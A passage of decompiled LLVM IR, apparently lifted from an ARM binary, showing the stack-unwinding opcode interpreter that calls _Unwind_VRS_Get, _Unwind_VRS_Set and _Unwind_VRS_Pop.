dec_label_pc_1a0f0:                               ; preds = %dec_label_pc_1a014
  %v1_1a0f0 = mul i32 %v0_1a014, 4
  %v3_1a0f4 = and i32 %v1_1a0f0, 252
  store i32 %v3_1a0f4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a100 = load i32, i32* @r7, align 4
  store i32 %v0_1a100, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1a108 = add nuw nsw i32 %v3_1a0f4, 4
  store i32 %v1_1a108, i32* %r6.global-to-local, align 4
  %v5_1a110 = call i32 @_Unwind_VRS_Get(i32 %v0_1a100, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1a114 = load i32, i32* @r4, align 4
  %v1_1a114 = and i32 %v0_1a114, 64
  %v2_1a114 = icmp eq i32 %v1_1a114, 0
  store i1 %v2_1a114, i1* %cpsr_z.global-to-local, align 1
  %v4_1a11c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1a128 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1a128
  %storemerge160.p = select i1 %v2_1a114, i32 %v2_1a128, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1a11c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1a144 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a144, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fbc.backedge

dec_label_pc_19fbc.backedge:                      ; preds = %dec_label_pc_1a0f0, %dec_label_pc_1a16c, %dec_label_pc_1a5f0, %dec_label_pc_1a2bc, %dec_label_pc_1a2f4, %dec_label_pc_1a274, %dec_label_pc_1a4e0
  %v0_19fbc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19fbc

dec_label_pc_1a14c:                               ; preds = %dec_label_pc_1a01c
  %v7_1a14c = icmp eq i32 %v1_1a01c, 144
  store i1 %v7_1a14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a14c, label %dec_label_pc_1a154, label %dec_label_pc_1a294

dec_label_pc_1a154:                               ; preds = %dec_label_pc_1a14c
  %v1_1a154 = urem i32 %v0_1a014, 16
  store i32 %v1_1a154, i32* %r2.global-to-local, align 4
  %v2_1a158 = icmp eq i32 %v1_1a154, 15
  store i1 %v2_1a158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a158, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a154
  %v8_1a15c = icmp eq i32 %v1_1a154, 13
  store i1 %v8_1a15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1a15c, label %bb154, label %dec_label_pc_1a16c

.thread21:                                        ; preds = %dec_label_pc_1a154
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a28c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a28c

dec_label_pc_1a16c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a178 = load i32, i32* @r7, align 4
  store i32 %v0_1a178, i32* %r0.global-to-local, align 4
  %v5_1a180 = call i32 @_Unwind_VRS_Get(i32 %v0_1a178, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a188 = load i32, i32* @r7, align 4
  store i32 %v0_1a188, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1a198 = call i32 @_Unwind_VRS_Set(i32 %v0_1a188, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a198, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fbc.backedge

dec_label_pc_1a1a0:                               ; preds = %dec_label_pc_1a0d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a1b0 = load i32, i32* @r7, align 4
  store i32 %v0_1a1b0, i32* %r0.global-to-local, align 4
  %v7_1a1b8 = call i32 @_Unwind_VRS_Get(i32 %v0_1a1b0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1a1bc = load i32, i32* @r7, align 4
  store i32 %v0_1a1bc, i32* %r0.global-to-local, align 4
  %v0_1a1c0 = load i32, i32* @sl, align 4
  store i32 %v0_1a1c0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1a1c0, i32* %r3.global-to-local, align 4
  %v5_1a1d0 = call i32 @_Unwind_VRS_Set(i32 %v0_1a1bc, i32 %v0_1a1c0, i32 15, i32 %v0_1a1c0, i8* bitcast (i32* @0 to i8*))
  %v0_1a1d4 = load i32, i32* @sl, align 4
  store i32 %v0_1a1d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a1dc:                               ; preds = %dec_label_pc_1a3d0
  %v7_1a1dc = icmp eq i32 %v0_1a3d0, 199
  store i1 %v7_1a1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1dc, label %dec_label_pc_1a4b0, label %dec_label_pc_1a1e4

dec_label_pc_1a1e4:                               ; preds = %dec_label_pc_1a1dc
  %v1_1a1e4 = and i32 %v0_1a014, 248
  store i32 %v1_1a1e4, i32* %r3.global-to-local, align 4
  %v7_1a1e8 = icmp eq i32 %v1_1a1e4, 192
  store i1 %v7_1a1e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1e8, label %.thread24, label %dec_label_pc_1a200

.thread24:                                        ; preds = %dec_label_pc_1a1e4
  %v2_1a1ec = urem i32 %v0_1a014, 16
  %v2_1a1f0 = add nuw nsw i32 %v2_1a1ec, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1a1f8 = or i32 %v2_1a1f0, 655360
  store i32 %v2_1a1f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a200:                               ; preds = %dec_label_pc_1a1e4
  %v7_1a200 = icmp eq i32 %v0_1a3d0, 200
  store i1 %v7_1a200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a200, label %dec_label_pc_1a444, label %dec_label_pc_1a208

dec_label_pc_1a208:                               ; preds = %dec_label_pc_1a200
  %v7_1a208 = icmp eq i32 %v0_1a3d0, 201
  store i1 %v7_1a208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a208, label %dec_label_pc_1a210, label %dec_label_pc_1a28c

dec_label_pc_1a210:                               ; preds = %dec_label_pc_1a208
  %v0_1a210 = load i32, i32* @r5, align 4
  %v1_1a210 = add i32 %v0_1a210, 8
  %v2_1a210 = inttoptr i32 %v1_1a210 to i8*
  %v3_1a210 = load i8, i8* %v2_1a210, align 1
  %v4_1a210 = zext i8 %v3_1a210 to i32
  store i32 %v4_1a210, i32* %r3.global-to-local, align 4
  %v2_1a214 = icmp eq i8 %v3_1a210, 0
  store i1 %v2_1a214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a214, label %dec_label_pc_1a224, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1a210
  %v2_1a218 = add nsw i32 %v4_1a210, -1
  store i32 %v2_1a218, i32* %r3.global-to-local, align 4
  %v2_1a21c = trunc i32 %v2_1a218 to i8
  store i8 %v2_1a21c, i8* %v2_1a210, align 1
  %v0_1a220.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a220.pr.pr, label %.thread26.dec_label_pc_1a224_crit_edge, label %dec_label_pc_1a258

.thread26.dec_label_pc_1a224_crit_edge:           ; preds = %.thread26
  %v0_1a224.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a224

dec_label_pc_1a224:                               ; preds = %.thread26.dec_label_pc_1a224_crit_edge, %dec_label_pc_1a210
  %v2_1a23c = phi i32 [ %v0_1a224.pre, %.thread26.dec_label_pc_1a224_crit_edge ], [ %v0_1a210, %dec_label_pc_1a210 ]
  %v1_1a224 = add i32 %v2_1a23c, 9
  %v2_1a224 = inttoptr i32 %v1_1a224 to i8*
  %v3_1a224 = load i8, i8* %v2_1a224, align 1
  %v4_1a224 = zext i8 %v3_1a224 to i32
  store i32 %v4_1a224, i32* %r3.global-to-local, align 4
  %v2_1a228 = icmp eq i8 %v3_1a224, 0
  store i1 %v2_1a228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a228, label %dec_label_pc_1a274, label %dec_label_pc_1a238

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a224
  %v1_1a238 = add nsw i32 %v4_1a224, -1
  store i32 %v1_1a238, i32* %r3.global-to-local, align 4
  %v1_1a23c = trunc i32 %v1_1a238 to i8
  store i8 %v1_1a23c, i8* %v2_1a224, align 1
  %v0_1a240 = load i32, i32* @r5, align 4
  %v1_1a240 = add i32 %v0_1a240, 4
  %v2_1a240 = inttoptr i32 %v1_1a240 to i32*
  %v3_1a240 = load i32, i32* %v2_1a240, align 4
  store i32 %v3_1a240, i32* %r2.global-to-local, align 4
  %v1_1a244 = inttoptr i32 %v3_1a240 to i32*
  %v2_1a244 = load i32, i32* %v1_1a244, align 4
  store i32 %v2_1a244, i32* %r0.global-to-local, align 4
  %v4_1a244 = add i32 %v3_1a240, 4
  store i32 %v4_1a244, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a244, i32* %v2_1a240, align 4
  %v0_1a250 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a250 = trunc i32 %v0_1a250 to i8
  %v2_1a250 = load i32, i32* @r5, align 4
  %v3_1a250 = add i32 %v2_1a250, 8
  %v4_1a250 = inttoptr i32 %v3_1a250 to i8*
  store i8 %v1_1a250, i8* %v4_1a250, align 1
  %v0_1a254 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a254 = load i32, i32* @r5, align 4
  %v2_1a254 = inttoptr i32 %v1_1a254 to i32*
  store i32 %v0_1a254, i32* %v2_1a254, align 4
  br label %dec_label_pc_1a258

dec_label_pc_1a258:                               ; preds = %.thread26, %dec_label_pc_1a238
  %v0_1a258 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a258 = udiv i32 %v0_1a258, 16777216
  %v1_1a25c = urem i32 %v3_1a258, 16
  %v3_1a260 = mul i32 %v0_1a258, 256
  %v1_1a264 = add nuw nsw i32 %v1_1a25c, 1
  store i32 %v1_1a264, i32* %r1.global-to-local, align 4
  %v1_1a268 = and i32 %v3_1a258, 240
  store i32 %v1_1a268, i32* %r3.global-to-local, align 4
  %v1_1a26c = load i32, i32* @r5, align 4
  %v2_1a26c = inttoptr i32 %v1_1a26c to i32*
  store i32 %v3_1a260, i32* %v2_1a26c, align 4
  %v0_1a270 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a270 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a270 = mul i32 %v1_1a270, 4096
  %v5_1a270 = or i32 %v4_1a270, %v0_1a270
  br label %dec_label_pc_1a274

dec_label_pc_1a274:                               ; preds = %dec_label_pc_1a224, %dec_label_pc_1a258
  %storemerge = phi i32 [ %v5_1a270, %dec_label_pc_1a258 ], [ 720897, %dec_label_pc_1a224 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1a274 = load i32, i32* @r7, align 4
  store i32 %v0_1a274, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a280 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a274, i32 1, i32 5, i32 5)
  store i32 %v4_1a280, i32* %r0.global-to-local, align 4
  %v2_1a284 = icmp eq i32 %v4_1a280, 0
  store i1 %v2_1a284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a284, label %dec_label_pc_19fbc.backedge, label %dec_label_pc_1a28c

dec_label_pc_1a28c:                               ; preds = %dec_label_pc_1a4d8, %dec_label_pc_1a208, %dec_label_pc_1a2e8, %dec_label_pc_1a68c, %dec_label_pc_1a65c, %dec_label_pc_1a638, %dec_label_pc_1a4c4, %dec_label_pc_1a274, %dec_label_pc_1a088, %dec_label_pc_1a07c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a294:                               ; preds = %dec_label_pc_1a14c
  %v7_1a294 = icmp eq i32 %v1_1a01c, 160
  store i1 %v7_1a294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a294, label %dec_label_pc_1a29c, label %dec_label_pc_1a2d8

dec_label_pc_1a29c:                               ; preds = %dec_label_pc_1a294
  %v0_1a29c = load i32, i32* %ip.global-to-local, align 4
  %v1_1a29c = urem i32 %v0_1a29c, 8
  %v1_1a2a0 = xor i32 %v1_1a29c, 7
  store i32 %v1_1a2a0, i32* %r3.global-to-local, align 4
  %v6_1a2a8 = lshr i32 4080, %v1_1a2a0
  %v1_1a2ac = and i32 %v0_1a014, 8
  %v2_1a2ac = icmp eq i32 %v1_1a2ac, 0
  store i1 %v2_1a2ac, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2b0 = and i32 %v6_1a2a8, 4080
  %tmp155 = mul nuw nsw i32 %v1_1a2ac, 2048
  %tmp156 = or i32 %v1_1a2b0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a2bc:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1a64c.dec_label_pc_1a2bc_crit_edge, %bb157, %dec_label_pc_1a4a8, %dec_label_pc_1a43c, %dec_label_pc_1a39c, %dec_label_pc_1a29c
  %v2_1a2c4 = phi i32 [ %v2_1a3c0, %.thread44 ], [ %v2_1a3c8, %bb157 ], [ %v2_1a2c4.pre, %dec_label_pc_1a64c.dec_label_pc_1a2bc_crit_edge ], [ %v2_1a1f8, %.thread24 ], [ %storemerge130, %dec_label_pc_1a4a8 ], [ %storemerge131, %dec_label_pc_1a43c ], [ %storemerge132, %dec_label_pc_1a39c ], [ %tmp156, %dec_label_pc_1a29c ]
  %v0_1a2c0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1a64c.dec_label_pc_1a2bc_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1a4a8 ], [ 3, %dec_label_pc_1a43c ], [ 1, %dec_label_pc_1a39c ], [ 0, %dec_label_pc_1a29c ]
  %v0_1a2bc = load i32, i32* @r7, align 4
  store i32 %v0_1a2bc, i32* %r0.global-to-local, align 4
  store i32 %v0_1a2c0, i32* %r3.global-to-local, align 4
  %v4_1a2c4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a2bc, i32 %v0_1a2c0, i32 %v2_1a2c4, i32 %v0_1a2c0)
  store i32 %v4_1a2c4, i32* %r0.global-to-local, align 4
  %v2_1a2c8 = icmp eq i32 %v4_1a2c4, 0
  store i1 %v2_1a2c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2c8, label %dec_label_pc_19fbc.backedge, label %dec_label_pc_1a2d0

dec_label_pc_1a2d0:                               ; preds = %dec_label_pc_1a2bc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a2d8:                               ; preds = %dec_label_pc_1a294
  %v7_1a2d8 = icmp eq i32 %v1_1a01c, 176
  store i1 %v7_1a2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2d8, label %dec_label_pc_1a320, label %dec_label_pc_1a2e0

dec_label_pc_1a2e0:                               ; preds = %dec_label_pc_1a2d8
  %v7_1a2e0 = icmp eq i32 %v1_1a01c, 192
  store i1 %v7_1a2e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2e0, label %dec_label_pc_1a3d0, label %dec_label_pc_1a2e8

dec_label_pc_1a2e8:                               ; preds = %dec_label_pc_1a2e0
  %v1_1a2e8 = and i32 %v0_1a014, 248
  store i32 %v1_1a2e8, i32* %r3.global-to-local, align 4
  %v7_1a2ec = icmp eq i32 %v1_1a2e8, 208
  store i1 %v7_1a2ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2ec, label %dec_label_pc_1a2f4, label %dec_label_pc_1a28c

dec_label_pc_1a2f4:                               ; preds = %dec_label_pc_1a2e8
  %v1_1a2f4 = urem i32 %v0_1a014, 8
  %v1_1a2f8 = add nuw nsw i32 %v1_1a2f4, 1
  %v1_1a2fc = or i32 %v1_1a2f8, 524288
  store i32 %v1_1a2fc, i32* %r2.global-to-local, align 4
  %v0_1a300 = load i32, i32* @r7, align 4
  store i32 %v0_1a300, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a30c = call i32 @_Unwind_VRS_Pop(i32 %v0_1a300, i32 1, i32 %v1_1a2fc, i32 5)
  store i32 %v4_1a30c, i32* %r0.global-to-local, align 4
  %v2_1a310 = icmp eq i32 %v4_1a30c, 0
  store i1 %v2_1a310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a310, label %dec_label_pc_19fbc.backedge, label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a2f4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0e4

dec_label_pc_1a320:                               ; preds = %dec_label_pc_1a2d8
  %v0_1a320 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a320 = icmp eq i32 %v0_1a320, 177
  store i1 %v7_1a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a320, label %dec_label_pc_1a624, label %dec_label_pc_1a328

dec_label_pc_1a328:                               ; preds = %dec_label_pc_1a320
  %v7_1a328 = icmp eq i32 %v0_1a320, 178
  store i1 %v7_1a328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a328, label %dec_label_pc_1a4fc, label %dec_label_pc_1a330

dec_label_pc_1a330:                               ; preds = %dec_label_pc_1a328
  %v7_1a330 = icmp eq i32 %v0_1a320, 179
  store i1 %v7_1a330, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a330, label %dec_label_pc_1a338, label %dec_label_pc_1a3a4

dec_label_pc_1a338:                               ; preds = %dec_label_pc_1a330
  %v0_1a338 = load i32, i32* @r5, align 4
  %v1_1a338 = add i32 %v0_1a338, 8
  %v2_1a338 = inttoptr i32 %v1_1a338 to i8*
  %v3_1a338 = load i8, i8* %v2_1a338, align 1
  %v4_1a338 = zext i8 %v3_1a338 to i32
  store i32 %v4_1a338, i32* %r3.global-to-local, align 4
  %v2_1a33c = icmp eq i8 %v3_1a338, 0
  store i1 %v2_1a33c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a33c, label %dec_label_pc_1a34c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1a338
  %v2_1a340 = add nsw i32 %v4_1a338, -1
  store i32 %v2_1a340, i32* %r3.global-to-local, align 4
  %v2_1a344 = trunc i32 %v2_1a340 to i8
  store i8 %v2_1a344, i8* %v2_1a338, align 1
  %v0_1a348.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a348.pr.pr, label %.thread30.dec_label_pc_1a34c_crit_edge, label %dec_label_pc_1a380

.thread30.dec_label_pc_1a34c_crit_edge:           ; preds = %.thread30
  %v0_1a34c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a34c

dec_label_pc_1a34c:                               ; preds = %.thread30.dec_label_pc_1a34c_crit_edge, %dec_label_pc_1a338
  %v2_1a364 = phi i32 [ %v0_1a34c.pre, %.thread30.dec_label_pc_1a34c_crit_edge ], [ %v0_1a338, %dec_label_pc_1a338 ]
  %v1_1a34c = add i32 %v2_1a364, 9
  %v2_1a34c = inttoptr i32 %v1_1a34c to i8*
  %v3_1a34c = load i8, i8* %v2_1a34c, align 1
  %v4_1a34c = zext i8 %v3_1a34c to i32
  store i32 %v4_1a34c, i32* %r3.global-to-local, align 4
  %v2_1a350 = icmp eq i8 %v3_1a34c, 0
  store i1 %v2_1a350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a350, label %dec_label_pc_1a39c, label %dec_label_pc_1a360

dec_label_pc_1a360:                               ; preds = %dec_label_pc_1a34c
  %v1_1a360 = add nsw i32 %v4_1a34c, -1
  store i32 %v1_1a360, i32* %r3.global-to-local, align 4
  %v1_1a364 = trunc i32 %v1_1a360 to i8
  store i8 %v1_1a364, i8* %v2_1a34c, align 1
  %v0_1a368 = load i32, i32* @r5, align 4
  %v1_1a368 = add i32 %v0_1a368, 4
  %v2_1a368 = inttoptr i32 %v1_1a368 to i32*
  %v3_1a368 = load i32, i32* %v2_1a368, align 4
  store i32 %v3_1a368, i32* %r2.global-to-local, align 4
  %v1_1a36c = inttoptr i32 %v3_1a368 to i32*
  %v2_1a36c = load i32, i32* %v1_1a36c, align 4
  store i32 %v2_1a36c, i32* %r0.global-to-local, align 4
  %v4_1a36c = add i32 %v3_1a368, 4
  store i32 %v4_1a36c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a36c, i32* %v2_1a368, align 4
  %v0_1a378 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a378 = trunc i32 %v0_1a378 to i8
  %v2_1a378 = load i32, i32* @r5, align 4
  %v3_1a378 = add i32 %v2_1a378, 8
  %v4_1a378 = inttoptr i32 %v3_1a378 to i8*
  store i8 %v1_1a378, i8* %v4_1a378, align 1
  %v0_1a37c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a37c = load i32, i32* @r5, align 4
  %v2_1a37c = inttoptr i32 %v1_1a37c to i32*
  store i32 %v0_1a37c, i32* %v2_1a37c, align 4
  br label %dec_label_pc_1a380

dec_label_pc_1a380:                               ; preds = %.thread30, %dec_label_pc_1a360
  %v0_1a380 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a380 = udiv i32 %v0_1a380, 16777216
  %v1_1a384 = urem i32 %v3_1a380, 16
  %v3_1a388 = mul i32 %v0_1a380, 256
  store i32 %v3_1a388, i32* %r0.global-to-local, align 4
  %v1_1a38c = add nuw nsw i32 %v1_1a384, 1
  store i32 %v1_1a38c, i32* %r2.global-to-local, align 4
  %v1_1a390 = and i32 %v3_1a380, 240
  store i32 %v1_1a390, i32* %r3.global-to-local, align 4
  %v1_1a394 = load i32, i32* @r5, align 4
  %v2_1a394 = inttoptr i32 %v1_1a394 to i32*
  store i32 %v3_1a388, i32* %v2_1a394, align 4
  %v0_1a398 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a398 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a398 = mul i32 %v1_1a398, 4096
  %v5_1a398 = or i32 %v4_1a398, %v0_1a398
  br label %dec_label_pc_1a39c

dec_label_pc_1a39c:                               ; preds = %dec_label_pc_1a34c, %dec_label_pc_1a380
  %storemerge132 = phi i32 [ %v5_1a398, %dec_label_pc_1a380 ], [ 720897, %dec_label_pc_1a34c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a330
  %v1_1a3a4 = and i32 %v0_1a014, 252
  store i32 %v1_1a3a4, i32* %r3.global-to-local, align 4
  %v7_1a3a8 = icmp eq i32 %v1_1a3a4, 180
  store i1 %v7_1a3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3a8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_1a3a4
  %v2_1a3ac = urem i32 %v0_1a014, 4
  %v2_1a3b4 = add nuw nsw i32 %v2_1a3ac, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_1a3c0 = or i32 %v2_1a3b4, 262144
  store i32 %v2_1a3c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2bc

bb157:                                            ; preds = %dec_label_pc_1a3a4
  %v2_1a3b0 = urem i32 %v0_1a320, 8
  %v2_1a3b8 = add nuw nsw i32 %v2_1a3b0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1a3c8 = or i32 %v2_1a3b8, 524288
  store i32 %v2_1a3c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a3d0:                               ; preds = %dec_label_pc_1a2e0
  %v0_1a3d0 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a3d0 = icmp eq i32 %v0_1a3d0, 198
  store i1 %v7_1a3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a3d0, label %dec_label_pc_1a3d8, label %dec_label_pc_1a1dc

dec_label_pc_1a3d8:                               ; preds = %dec_label_pc_1a3d0
  %v0_1a3d8 = load i32, i32* @r5, align 4
  %v1_1a3d8 = add i32 %v0_1a3d8, 8
  %v2_1a3d8 = inttoptr i32 %v1_1a3d8 to i8*
  %v3_1a3d8 = load i8, i8* %v2_1a3d8, align 1
  %v4_1a3d8 = zext i8 %v3_1a3d8 to i32
  store i32 %v4_1a3d8, i32* %r3.global-to-local, align 4
  %v2_1a3dc = icmp eq i8 %v3_1a3d8, 0
  store i1 %v2_1a3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3dc, label %dec_label_pc_1a3ec, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1a3d8
  %v2_1a3e0 = add nsw i32 %v4_1a3d8, -1
  store i32 %v2_1a3e0, i32* %r3.global-to-local, align 4
  %v2_1a3e4 = trunc i32 %v2_1a3e0 to i8
  store i8 %v2_1a3e4, i8* %v2_1a3d8, align 1
  %v0_1a3e8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a3e8.pr.pr, label %.thread48.dec_label_pc_1a3ec_crit_edge, label %dec_label_pc_1a420

.thread48.dec_label_pc_1a3ec_crit_edge:           ; preds = %.thread48
  %v0_1a3ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a3ec

dec_label_pc_1a3ec:                               ; preds = %.thread48.dec_label_pc_1a3ec_crit_edge, %dec_label_pc_1a3d8
  %v2_1a404 = phi i32 [ %v0_1a3ec.pre, %.thread48.dec_label_pc_1a3ec_crit_edge ], [ %v0_1a3d8, %dec_label_pc_1a3d8 ]
  %v1_1a3ec = add i32 %v2_1a404, 9
  %v2_1a3ec = inttoptr i32 %v1_1a3ec to i8*
  %v3_1a3ec = load i8, i8* %v2_1a3ec, align 1
  %v4_1a3ec = zext i8 %v3_1a3ec to i32
  store i32 %v4_1a3ec, i32* %r3.global-to-local, align 4
  %v2_1a3f0 = icmp eq i8 %v3_1a3ec, 0
  store i1 %v2_1a3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a3f0, label %dec_label_pc_1a43c, label %dec_label_pc_1a400

dec_label_pc_1a400:                               ; preds = %dec_label_pc_1a3ec
  %v1_1a400 = add nsw i32 %v4_1a3ec, -1
  store i32 %v1_1a400, i32* %r3.global-to-local, align 4
  %v1_1a404 = trunc i32 %v1_1a400 to i8
  store i8 %v1_1a404, i8* %v2_1a3ec, align 1
  %v0_1a408 = load i32, i32* @r5, align 4
  %v1_1a408 = add i32 %v0_1a408, 4
  %v2_1a408 = inttoptr i32 %v1_1a408 to i32*
  %v3_1a408 = load i32, i32* %v2_1a408, align 4
  store i32 %v3_1a408, i32* %r2.global-to-local, align 4
  %v1_1a40c = inttoptr i32 %v3_1a408 to i32*
  %v2_1a40c = load i32, i32* %v1_1a40c, align 4
  store i32 %v2_1a40c, i32* %r0.global-to-local, align 4
  %v4_1a40c = add i32 %v3_1a408, 4
  store i32 %v4_1a40c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a40c, i32* %v2_1a408, align 4
  %v0_1a418 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a418 = trunc i32 %v0_1a418 to i8
  %v2_1a418 = load i32, i32* @r5, align 4
  %v3_1a418 = add i32 %v2_1a418, 8
  %v4_1a418 = inttoptr i32 %v3_1a418 to i8*
  store i8 %v1_1a418, i8* %v4_1a418, align 1
  %v0_1a41c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a41c = load i32, i32* @r5, align 4
  %v2_1a41c = inttoptr i32 %v1_1a41c to i32*
  store i32 %v0_1a41c, i32* %v2_1a41c, align 4
  br label %dec_label_pc_1a420

dec_label_pc_1a420:                               ; preds = %.thread48, %dec_label_pc_1a400
  %v0_1a420 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a420 = udiv i32 %v0_1a420, 16777216
  %v1_1a424 = urem i32 %v3_1a420, 16
  %v3_1a428 = mul i32 %v0_1a420, 256
  store i32 %v3_1a428, i32* %r0.global-to-local, align 4
  %v1_1a42c = add nuw nsw i32 %v1_1a424, 1
  store i32 %v1_1a42c, i32* %r2.global-to-local, align 4
  %v1_1a430 = and i32 %v3_1a420, 240
  store i32 %v1_1a430, i32* %r3.global-to-local, align 4
  %v1_1a434 = load i32, i32* @r5, align 4
  %v2_1a434 = inttoptr i32 %v1_1a434 to i32*
  store i32 %v3_1a428, i32* %v2_1a434, align 4
